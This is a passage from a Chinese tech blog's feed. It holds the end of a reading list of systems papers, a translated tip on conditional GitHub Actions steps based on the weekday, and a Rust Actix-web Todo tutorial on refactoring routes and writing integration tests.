href="http://s3.amazonaws.com/AllThingsDistributed/sosp/amazon-dynamo-sosp2007.pdf">2007年：Dynamo：亚马逊的高可用键值存储</a><ul><li>Dynamo论文启动了NoSQL革命</li></ul></li><li><a href="https://www.akkadia.org/drepper/cpumemory.pdf">2007: 每个程序员都应该知道的内存知识 (非常长，作者建议跳过某些章节来阅读)</a></li><li><a href="https://research.google.com/pubs/archive/36356.pdf">2010年：Dapper，一个大型分布式系统跟踪基础结构</a></li><li><a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/36632.pdf">2010年：Dremel：Web规模数据集的交互式分析</a></li><li><a href="https://www.wired.com/2012/07/google-colossus/">2012: Google 的 Colossus</a><ul><li>没有论文</li></ul></li><li>2012: AddressSanitizer: 快速的内存访问检查器:<ul><li><a href="http://static.googleusercontent.com/media/research.google.com/en//pubs/archive/37752.pdf">论文</a></li><li><a href="https://www.usenix.org/conference/atc12/technical-sessions/presentation/serebryany">视频</a></li></ul></li><li>2013: Spanner: Google 的分布式数据库:<ul><li><a href="http://static.googleusercontent.com/media/research.google.com/en//archive/spanner-osdi2012.pdf">论文</a></li><li><a href="https://www.usenix.org/node/170855">视频</a></li></ul></li><li><a href="http://static.googleusercontent.com/media/research.google.com/en//pubs/archive/43146.pdf">2014: Machine Learning: The High-Interest Credit Card of Technical Debt</a></li><li><a href="http://static.googleusercontent.com/media/research.google.com/en//pubs/archive/43790.pdf">2015: Continuous Pipelines at Google</a></li><li><a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/44686.pdf">2015: 大规模高可用: 构建 Google Ads 的数据基础设施</a></li><li><a href="http://download.tensorflow.org/paper/whitepaper2015.pdf">2015: TensorFlow: 异构分布式系统上的大规模机器学习</a></li><li><a href="http://static.googleusercontent.com/media/research.google.com/en//pubs/archive/43835.pdf">2015: 开发者应该如何搜索代码：用例学习</a></li><li><a href="http://static.googleusercontent.com/media/research.google.com/en//pubs/archive/44843.pdf">2016: Borg, Omega, and Kubernetes</a></li></ul><h2><span id="license">LICENSE</span></h2><p><a href="https://github.com/jwasham/coding-interview-university/blob/master/LICENSE.txt">CC-BY-SA-4.0</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      编码面试学习手册（Coding Interview University）
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
      <category term="机器学习" scheme="https://qiwihui.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions 第16天：共享数据的条件</title>
    <link href="https://qiwihui.com/qiwihui-blog-99/"/>
    <id>https://qiwihui.com/qiwihui-blog-99/</id>
    <published>2022-08-13T01:54:25.570Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>昨天，我们研究了如何在工作流步骤之一中<a href="https://qiwihui.com/qiwihui-blog-98/">设置自定义数据</a>，以便在后续步骤中使用。我们通过向<a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/contexts-and-expression-syntax-for-github-actions#contexts">env上下文</a>添加数据来做到这一点，它是一个你可以读写的属性包。</p><p>但是你不必将自己局限于仅在你的步骤中使用 <code>env</code> 上下文。你还可以在工作流本身中使用 <code>env</code> 上下文，并根据在先前步骤中设置的数据来<a href="https://qiwihui.com/qiwihui-blog-96/">设置条件</a>。</p><p>例如，你可能有一个每天要运行的工作流，并且你希望对该工作流在星期一的运行方式进行较小的修改。你可以使用 <a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/workflow-syntax-for-github-actions#onschedule"><code>schedule</code> 触发器</a>每天运行工作流程。你可以复制该工作流程，并添加只希望在星期一运行的特殊更改。但是，呵呵，维持两个相似但只有一点点不同的工作流程是一个严重的难题。</p><span id="more"></span><p>取而代之的是，你可以查看星期几并在此基础上设置一个环境变量──在这里，我将使用bash语法运行 <code>date</code> 命令以打印缩写的星期几，并将其放入我的 <code>echo</code> 语句中，将 <code>DAY_OF_WEEK</code> 在我们的 <code>env</code> 上下文中设置变量 。然后，我将其 <code>env.DAY_OF_WEEK</code> 作为后续步骤的条件。</p><script src="https://gist.github.com/ethomson/c241fcd622172139ccaae0ab8088c75c.js"></script><p>使用此配置，我将每天在世界标准时间05:00运行工作流。与今天一样，在星期一，将运行仅星期一的步骤。</p><p><img src="https://user-images.githubusercontent.com/3297411/77852191-d8776280-720f-11ea-99f0-a50f64ceabd6.png" alt="image"></p><p>但是在本周的剩余时间里，该步骤将被跳过。</p><p><img src="https://user-images.githubusercontent.com/3297411/77852197-dca38000-720f-11ea-8aa0-9ccfab150f3a.png" alt="image"></p><p>这是另一个很好的例子，说明GitHub Actions如何为你提供简单的原语，你可以将它们组合在一起以创建功能强大的工作流。</p><p>原文链接：<a href="https://www.edwardthomson.com/blog/github_actions_16_conditionals_with_shared_data.html">https://www.edwardthomson.com/blog/github_actions_16_conditionals_with_shared_data.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions 第16天：共享数据的条件
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>用 Rust Actix-web 写一个 Todo 应用（四）── 测试</title>
    <link href="https://qiwihui.com/qiwihui-blog-108/"/>
    <id>https://qiwihui.com/qiwihui-blog-108/</id>
    <published>2022-08-13T01:54:25.560Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>对程序进行集成测试。</p><span id="more"></span><h2><span id="ce-shi-qian-chong-gou">测试前重构</span></h2><p>在测试前，先简单重构，方便构建测试。</p><h3><span id="1-jiang-lu-you-chou-qu-cheng-dan-du-de-mo-kuai">1. 将路由抽取成单独的模块</span></h3><p><code>routes.rs</code></p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> crate::handlers;</span><br><span class="line"><span class="keyword">use</span> actix_web::web;</span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">routes</span>(cfg: &amp;<span class="keyword">mut</span> web::ServiceConfig) &#123;</span><br><span class="line">    cfg.<span class="title function_ invoke__">service</span>(handlers::hello)</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::todos))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">post</span>().<span class="title function_ invoke__">to</span>(handlers::create_todo))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos/&#123;list_id&#125;&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::todo))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(</span><br><span class="line">            <span class="string">&quot;/todos/&#123;list_id&#125;/items&#123;_:/?&#125;&quot;</span>,</span><br><span class="line">            web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::items),</span><br><span class="line">        )</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(</span><br><span class="line">            <span class="string">&quot;/todos/&#123;list_id&#125;/items&#123;_:/?&#125;&quot;</span>,</span><br><span class="line">            web::<span class="title function_ invoke__">post</span>().<span class="title function_ invoke__">to</span>(handlers::create_item),</span><br><span class="line">        )</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(</span><br><span class="line">            <span class="string">&quot;/todos/&#123;list_id&#125;/items/&#123;item_id&#125;&#123;_:/?&#125;&quot;</span>,</span><br><span class="line">            web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::get_item),</span><br><span class="line">        )</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(</span><br><span class="line">            <span class="string">&quot;/todos/&#123;list_id&#125;/items/&#123;item_id&#125;&#123;_:/?&#125;&quot;</span>,</span><br><span class="line">            web::<span class="title function_ invoke__">put</span>().<span class="title function_ invoke__">to</span>(handlers::check_todo),</span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并将原来的 <code>hello</code> 视图移至 <code>handlers.rs</code> 中，此时 <code>main.rs</code> 中路由修改为如下：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">+<span class="keyword">mod</span> routes;</span><br><span class="line"><span class="comment">// ... 省略</span></span><br><span class="line">+<span class="keyword">use</span> routes::routes;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ... 转移</span></span><br><span class="line">-<span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line">-<span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">hello</span>() <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">-    <span class="built_in">format!</span>(<span class="string">&quot;Hello world!&quot;</span>)</span><br><span class="line">-&#125;</span><br><span class="line">-</span><br><span class="line"> <span class="meta">#[actix_web::main]</span></span><br><span class="line"> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">     <span class="title function_ invoke__">dotenv</span>().<span class="title function_ invoke__">ok</span>();</span><br><span class="line">@@ -<span class="number">34</span>,<span class="number">26</span> +<span class="number">31</span>,<span class="number">7</span> @@ <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">         App::<span class="title function_ invoke__">new</span>()</span><br><span class="line">             .<span class="title function_ invoke__">data</span>(AppState &#123; pool: pool.<span class="title function_ invoke__">clone</span>() &#125;)</span><br><span class="line">             .<span class="title function_ invoke__">wrap</span>(middleware::Logger::<span class="title function_ invoke__">default</span>())</span><br><span class="line"><span class="comment">// ... 转移</span></span><br><span class="line">-            .<span class="title function_ invoke__">service</span>(hello)</span><br><span class="line">-            .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::todos))</span><br><span class="line">-            .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">post</span>().<span class="title function_ invoke__">to</span>(handlers::create_todo))</span><br><span class="line">-            .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos/&#123;list_id&#125;&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::todo))</span><br><span class="line">-            .<span class="title function_ invoke__">route</span>(</span><br><span class="line">-                <span class="string">&quot;/todos/&#123;list_id&#125;/items&#123;_:/?&#125;&quot;</span>,</span><br><span class="line">-                web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::items),</span><br><span class="line">-            )</span><br><span class="line">-            .<span class="title function_ invoke__">route</span>(</span><br><span class="line">-                <span class="string">&quot;/todos/&#123;list_id&#125;/items&#123;_:/?&#125;&quot;</span>,</span><br><span class="line">-                web::<span class="title function_ invoke__">post</span>().<span class="title function_ invoke__">to</span>(handlers::create_item),</span><br><span class="line">-            )</span><br><span class="line">-            .<span class="title function_ invoke__">route</span>(</span><br><span class="line">-                <span class="string">&quot;/todos/&#123;list_id&#125;/items/&#123;item_id&#125;&#123;_:/?&#125;&quot;</span>,</span><br><span class="line">-                web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::get_item),</span><br><span class="line">-            )</span><br><span class="line">-            .<span class="title function_ invoke__">route</span>(</span><br><span class="line">-                <span class="string">&quot;/todos/&#123;list_id&#125;/items/&#123;item_id&#125;&#123;_:/?&#125;&quot;</span>,</span><br><span class="line">-                web::<span class="title function_ invoke__">put</span>().<span class="title function_ invoke__">to</span>(handlers::check_todo),</span><br><span class="line">-            )</span><br><span class="line">+            .<span class="title function_ invoke__">configure</span>(routes)</span><br><span class="line">     &#125;)</span><br><span class="line">     .<span class="title function_ invoke__">bind</span>(<span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>, cfg.server.host, cfg.server.port))?</span><br><span class="line">     .<span class="title function_ invoke__">run</span>()</span><br></pre></td></tr></table></figure><h3><span id="2-zeng-jia-init-pool-fang-fa">2. 增加 <code>init_pool</code> 方法</span></h3><p>首先我们添加一个配置错误处理：</p><p><code>errors.rs</code>：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">@@ -<span class="number">10</span>,<span class="number">6</span> +<span class="number">12</span>,<span class="number">7</span> @@ <span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Error</span> &#123;</span><br><span class="line">     <span class="title function_ invoke__">InternalServerError</span>(<span class="type">String</span>),</span><br><span class="line">     <span class="title function_ invoke__">NotFound</span>(<span class="type">String</span>),</span><br><span class="line">     <span class="title function_ invoke__">PoolError</span>(<span class="type">String</span>),</span><br><span class="line">+    <span class="title function_ invoke__">ConfigError</span>(<span class="type">String</span>),</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在 <code>config.rs</code> 中增加 <code>init_pool</code> 方法：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> crate::errors::Error;</span><br><span class="line"><span class="keyword">use</span> deadpool_postgres::Pool;</span><br><span class="line"><span class="keyword">use</span> tokio_postgres::NoTls;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... 省略</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">init_pool</span>(config: &amp;Config) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;Pool, Error&gt; &#123;</span><br><span class="line">    <span class="keyword">match</span> config.pg.<span class="title function_ invoke__">create_pool</span>(NoTls) &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(pool) =&gt; <span class="title function_ invoke__">Ok</span>(pool),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(_) =&gt; <span class="title function_ invoke__">Err</span>(Error::<span class="title function_ invoke__">ConfigError</span>(<span class="string">&quot;config error&quot;</span>.<span class="title function_ invoke__">into</span>())),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="ce-shi">测试</span></h2><p>首先，增加运行时环境包:</p><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">actix-rt</span> = <span class="string">&quot;1&quot;</span></span><br></pre></td></tr></table></figure><p>创建 <code>tests</code> 目录，并添加如下文件，</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">src/tests/</span><br><span class="line">├── handlers.rs</span><br><span class="line">├── helpers.rs</span><br><span class="line">└── mod.rs</span><br></pre></td></tr></table></figure><p>在 <a href="http://main.rs">main.rs</a> 中增加 <code>tests</code> 模块：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[cfg(test)]</span></span><br><span class="line"><span class="keyword">mod</span> tests;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>其中，<code>handlers.rs</code> 用于集成测试，<code>helpers.rs</code> 提供基本的测试方法。</p><p><code>mod.rs</code>：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mod</span> handlers;</span><br><span class="line"><span class="keyword">mod</span> helpers;</span><br></pre></td></tr></table></figure><p>我们先测试一下 <code>/</code> 路由下 <code>hello world</code> 的功能。</p><p><code>helpers.rs</code> 中增加基本的 <code>get</code> 测试方法：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> crate::routes::routes;</span><br><span class="line"><span class="keyword">use</span> actix_web::dev::ServiceResponse;</span><br><span class="line"><span class="keyword">use</span> actix_web::&#123;test, App&#125;;</span><br><span class="line"><span class="comment">// 测试get</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">test_get</span>(route: &amp;<span class="type">str</span>) <span class="punctuation">-&gt;</span> ServiceResponse &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">app</span> = test::<span class="title function_ invoke__">init_service</span>(App::<span class="title function_ invoke__">new</span>().<span class="title function_ invoke__">configure</span>(routes)).<span class="keyword">await</span>;</span><br><span class="line">    test::<span class="title function_ invoke__">call_service</span>(&amp;<span class="keyword">mut</span> app, test::TestRequest::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">uri</span>(route).<span class="title function_ invoke__">to_request</span>()).<span class="keyword">await</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// assert get 方法</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">assert_get</span>(route: &amp;<span class="type">str</span>) <span class="punctuation">-&gt;</span> ServiceResponse &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">response</span> = <span class="title function_ invoke__">test_get</span>(route).<span class="keyword">await</span>;</span><br><span class="line">    <span class="built_in">assert!</span>(response.<span class="title function_ invoke__">status</span>().<span class="title function_ invoke__">is_success</span>());</span><br><span class="line">    response</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>handlers.rs</code>：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> crate::tests::helpers::assert_get;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_rt::test]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">test_hello_world</span>() &#123;</span><br><span class="line">    <span class="title function_ invoke__">assert_get</span>(<span class="string">&quot;/&quot;</span>).<span class="keyword">await</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行测试：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">cargo <span class="built_in">test</span></span></span><br><span class="line"></span><br><span class="line">running 1 test</span><br><span class="line">test tests::handlers::tests::test_hello_world ... ok</span><br><span class="line"></span><br><span class="line">test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out</span><br></pre></td></tr></table></figure><p>可以看到这个测试成功了。</p><h2><span id="ce-shi-post-jie-kou">测试 <code>POST</code> 接口</span></h2><p>我们增加 <code>lazy_static</code> 和 <code>serde_json</code> 库，前者用于延后执行，后者用于方便处理 json 数据。</p><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dev-dependencies]</span></span><br><span class="line"><span class="attr">lazy_static</span> = <span class="string">&quot;1.4.0&quot;</span></span><br><span class="line"><span class="attr">serde_json</span> = <span class="string">&quot;1.0.48&quot;</span></span><br></pre></td></tr></table></figure><p>在集成测试中，我们将使用数据库链接进行测试，首先 <code>helpers.rs</code> 中增加 <code>AppState</code> 用于测试：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">lazy_static! &#123;</span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">static</span> <span class="keyword">ref</span> APP_STATE: models::AppState = &#123;</span><br><span class="line">        <span class="title function_ invoke__">dotenv</span>().<span class="title function_ invoke__">ok</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">config</span> = Config::<span class="title function_ invoke__">from_env</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">pool</span> = <span class="title function_ invoke__">init_pool</span>(&amp;config).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">        models::AppState &#123; pool: pool.<span class="title function_ invoke__">clone</span>() &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以及对应的 post 测试断言：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 其中 `AppState` 需要增加 `Clone` 宏</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">test_post</span>&lt;T: Serialize&gt;(route: &amp;<span class="type">str</span>, params: T) <span class="punctuation">-&gt;</span> ServiceResponse &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">app</span> = test::<span class="title function_ invoke__">init_service</span>(App::<span class="title function_ invoke__">new</span>().<span class="title function_ invoke__">data</span>(APP_STATE.<span class="title function_ invoke__">clone</span>()).<span class="title function_ invoke__">configure</span>(routes)).<span class="keyword">await</span>;</span><br><span class="line">    test::<span class="title function_ invoke__">call_service</span>(</span><br><span class="line">        &amp;<span class="keyword">mut</span> app,</span><br><span class="line">        test::TestRequest::<span class="title function_ invoke__">post</span>()</span><br><span class="line">            .<span class="title function_ invoke__">set_json</span>(&amp;params)</span><br><span class="line">            .<span class="title function_ invoke__">uri</span>(route)</span><br><span class="line">            .<span class="title function_ invoke__">to_request</span>(),</span><br><span class="line">    )</span><br><span class="line">    .<span class="keyword">await</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">assert_post</span>&lt;T: Serialize&gt;(route: &amp;<span class="type">str</span>, params: T) <span class="punctuation">-&gt;</span> ServiceResponse &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">response</span> = <span class="title function_ invoke__">test_post</span>(route, params).<span class="keyword">await</span>;</span><br><span class="line">    <span class="built_in">assert!</span>(response.<span class="title function_ invoke__">status</span>().<span class="title function_ invoke__">is_success</span>());</span><br><span class="line">    response</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，我们增加一个创建 todo_list 的测试，包含创建并检测是否存在：</p><p><code>tests/handlers.rs</code>：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[actix_rt::test]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">test_create_todos</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">todo_title</span> = <span class="string">&quot;Create todo List&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">params</span> = CreateTodoList &#123;</span><br><span class="line">        title: todo_title.<span class="title function_ invoke__">into</span>(),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">response</span> = <span class="title function_ invoke__">assert_post</span>(<span class="string">&quot;/todos&quot;</span>, params).<span class="keyword">await</span>;</span><br><span class="line">    <span class="comment">// 检查放返回数据</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">body</span> = test::<span class="title function_ invoke__">read_body</span>(response).<span class="keyword">await</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">try_created</span>: <span class="type">Result</span>&lt;models::TodoList, serde_json::error::Error&gt; =</span><br><span class="line">        serde_json::<span class="title function_ invoke__">from_slice</span>(&amp;body);</span><br><span class="line">    <span class="built_in">assert!</span>(try_created.<span class="title function_ invoke__">is_ok</span>(), <span class="string">&quot;Response couldn&#x27;t not be parsed&quot;</span>);</span><br><span class="line">    <span class="comment">// 使用接口查看数据</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">created_list</span> = try_created.<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">resp</span> = <span class="title function_ invoke__">assert_get</span>(<span class="string">&quot;/todos&quot;</span>).<span class="keyword">await</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">todos</span>: <span class="type">Vec</span>&lt;models::TodoList&gt; = test::<span class="title function_ invoke__">read_body_json</span>(resp).<span class="keyword">await</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">maybe_list</span> = todos.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">find</span>(|todo| todo.id == created_list.id);</span><br><span class="line">    <span class="built_in">assert!</span>(maybe_list.<span class="title function_ invoke__">is_some</span>(), <span class="string">&quot;Item not found!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>CreateTodoList</code> 需要增加 <code>Clone</code> 宏，才能在传入 <code>params</code> 参数时正常使用。</p><p>运行测试，查看结果</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">cargo <span class="built_in">test</span></span></span><br><span class="line"></span><br><span class="line">running 2 tests</span><br><span class="line">test tests::handlers::test_hello_world ... ok</span><br><span class="line">test tests::handlers::test_create_todos ... ok</span><br><span class="line"></span><br><span class="line">test result: ok. 2 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out</span><br></pre></td></tr></table></figure><h2><span id="ce-shi-get-jie-kou">测试 <code>GET</code> 接口</span></h2><p>最后添加 <code>GET</code> 集成测试：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> crate::db::create_todo;</span><br><span class="line"><span class="keyword">use</span> crate::tests::helpers::&#123;assert_get, assert_post, APP_STATE&#125;;</span><br><span class="line"><span class="keyword">use</span> deadpool_postgres::Client;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_rt::test]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">test_get_todos</span>() &#123;</span><br><span class="line">    <span class="comment">// create data in db</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">todo_title</span> = <span class="string">&quot;New Todo List&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">client</span>: Client = APP_STATE</span><br><span class="line">        .pool</span><br><span class="line">        .<span class="title function_ invoke__">get</span>()</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Error connecting to the database&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">new_todo</span> = <span class="title function_ invoke__">create_todo</span>(&amp;client, todo_title.<span class="title function_ invoke__">into</span>()).<span class="keyword">await</span>;</span><br><span class="line">    <span class="built_in">assert!</span>(new_todo.<span class="title function_ invoke__">is_ok</span>(), <span class="string">&quot;Failed to create new test todo&quot;</span>);</span><br><span class="line">    <span class="comment">// get and check</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">new_todo</span> = new_todo.<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">response</span> = <span class="title function_ invoke__">assert_get</span>(<span class="string">&quot;/todos&quot;</span>).<span class="keyword">await</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">todos</span>: <span class="type">Vec</span>&lt;models::TodoList&gt; = test::<span class="title function_ invoke__">read_body_json</span>(response).<span class="keyword">await</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">maybe_list</span> = todos.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">find</span>(|todo| todo.id == new_todo.id);</span><br><span class="line">    <span class="built_in">assert!</span>(maybe_list.<span class="title function_ invoke__">is_some</span>(), <span class="string">&quot;Item not found!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">$ cargo test</span><br><span class="line"></span><br><span class="line">running <span class="number">3</span> tests</span><br><span class="line">test tests::handlers::test_hello_world ... ok</span><br><span class="line">test tests::handlers::test_get_todos ... ok</span><br><span class="line">test tests::handlers::test_create_todos ... ok</span><br><span class="line"></span><br><span class="line">test result: ok. <span class="number">3</span> passed; <span class="number">0</span> failed; <span class="number">0</span> ignored; <span class="number">0</span> measured; <span class="number">0</span> filtered out</span><br></pre></td></tr></table></figure><h2><span id="xiao-jie">小结</span></h2><ol><li>简单重构，抽象工具函数；</li><li>抽象测试工具函数；</li><li>创建 <code>GET</code> 和 <code>POST</code> 测试。</li></ol><h2><span id="can-kao-wen-dang-he-xiang-mu">参考文档和项目</span></h2><ol><li><a href="https://www.youtube.com/watch?v=gQwA0g0NNSI">Creating a simple TODO service with Actix</a></li><li><a href="actix.rs">actix-web 官方文档</a></li><li><a href="https://github.com/actix/examples">官方 actix-web 示例</a></li></ol><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a 